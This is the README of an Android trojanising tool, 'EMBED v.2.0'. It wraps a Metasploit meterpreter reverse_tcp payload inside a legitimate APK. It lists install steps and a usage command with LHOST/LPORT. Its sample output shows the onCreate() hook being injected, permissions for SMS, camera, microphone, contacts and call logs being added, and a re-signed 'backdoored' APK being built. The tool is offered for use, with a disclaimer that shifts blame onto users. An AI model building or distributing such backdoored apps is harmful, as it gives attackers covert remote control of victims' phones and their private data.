# EMBED v.2.0
This tool creates a payload with metasploit framework and injected into a legitimate APK.

	DISCLAIMER
If the law is violated with it's use, this would be the responsibility of the user who handled it..
Ivam3 is not responsible for the misuse that can be given to everything that this laboratory entails

# REQUIREMENTS.
- Metasploit
- Java
- Keytool
- Apktool
- Jarsigner
- Apksigner
- Aapt

# INSTALLATION.
Clone this repositorie:

	$  apt install git -y
	$  git clone https://github.com/ivam3/embed.git

Give execute permissions to the configuration file setup:

	$  chmod +x setup

Now run the setup file:

	$  bash setup

This file will install and configure Termux with all the required libraries and dependencies including java for termux.

# JAVA FOR TERMUX.
For more information about java join to:

	https://github.com/ivam3/java

This software and related documentation are provided under license agreement containing in www.java.com. Please refer to http://java.com/licensereadme.

# USAGE

	root@user# ruby EMBED.rb PATH/to/legitim.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4546

	   ._____ __  __ ____  _____ ____
	   | ____|  \/  | __ )| ____|  _ \
	   |  _| |TERMUX|  _ \|  _| | | | |
	   | |___| |\/| | |_) | |___| |_| |
	   |_____|_|  |_|____/|_____|____/ v.2
	   #:::::::: By Ivam3 ::::::::::::#

	[*]─➤ Generating msfvenom payload..
	[*]─➤ Signing payload..
	[*]─➤ Decompiling orignal APK..
	[*]─➤ Ignoring the resource decompilation..
	[*]─➤ Decompiling payload APK..
	[*]─➤ Locating onCreate() hook..
	[*]─➤ Copying payload files..
	[*]─➤ Loading original/smali/devian/tubemate/home/Main.smali and injecting payload..
	[*]─➤ Poisoning the manifest with meterpreter permissions..
	[+]─➤ Adding android.permission.SEND_SMS
	[+]─➤ Adding android.permission.RECEIVE_SMS
	[+]─➤ Adding android.permission.RECORD_AUDIO
	[+]─➤ Adding android.permission.CALL_PHONE
	[+]─➤ Adding android.permission.READ_CONTACTS
	[+]─➤ Adding android.permission.WRITE_CONTACTS
	[+]─➤ Adding android.permission.RECORD_AUDIO
	[+]─➤ Adding android.permission.CAMERA
	[+]─➤ Adding android.permission.READ_SMS
	[+]─➤ Adding android.permission.RECEIVE_BOOT_COMPLETED
	[+]─➤ Adding android.permission.SET_WALLPAPER
	[+]─➤ Adding android.permission.READ_CALL_LOG
	[+]─➤ Adding android.permission.WRITE_CALL_LOG
	[*]─➤ Rebuilding /sdcard/Download/tubemate-2-4-21.apk with meterpreter injection as data/data/com_backdoored.apk..
	[*]─➤ Signing data/data/com_backdoored.apk ..
	[*]─➤ Aligning data/data/com_backdoored.apk ..
	[+]─➤ Infected file legitim.apk_final ready.


This tool was written by Ivam3, <https://t.me/Ivam3byCinderella>
Some maintenance releases have been done by <https://t.me/Ivam3_Bot>

